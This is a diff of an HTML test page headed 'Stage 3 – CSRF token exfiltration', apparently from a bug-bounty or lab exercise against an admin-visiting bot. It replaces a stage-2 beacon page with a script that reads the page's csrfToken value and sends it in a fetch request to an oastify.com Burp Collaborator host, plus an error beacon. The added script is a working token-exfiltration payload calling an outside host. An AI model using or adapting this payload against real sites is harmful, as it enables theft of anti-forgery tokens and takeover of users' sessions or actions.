@@ -1,22 +1,20 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>Admin test stage 2</h2>
+    <h3>Stage 3 – CSRF token exfiltration</h3>
 
-    <!-- Confirm admin visit -->
-    <img src="https://tc9z9khwuwgpklyl1t4pnqvxdojf76vv.oastify.com/admin-stage2" />
-
-    <!-- Dummy form -->
-    <form id="csrfForm" action="http://localhost:3000/fake" method="POST">
-      <input type="hidden" name="csrfToken" value="faketoken" />
-    </form>
-
-    <!-- Harmless script that just calls your Collaborator -->
     <script>
-      fetch("https://tc9z9khwuwgpklyl1t4pnqvxdojf76vv.oastify.com/js-ran?step=2");
+      // Wait for DOM to render
+      setTimeout(() => {
+        try {
+          const token = document.querySelector('[name="csrfToken"]').value;
+          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token=" + token);
+        } catch (e) {
+          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?error=no-token");
+        }
+      }, 500);
     </script>
 
-    <!-- Required for bot click -->
-    <button id="installbutton" onclick="console.log('clicked')">Install</button>
+    <button id="installbutton">Click</button>
   </body>
 </html>
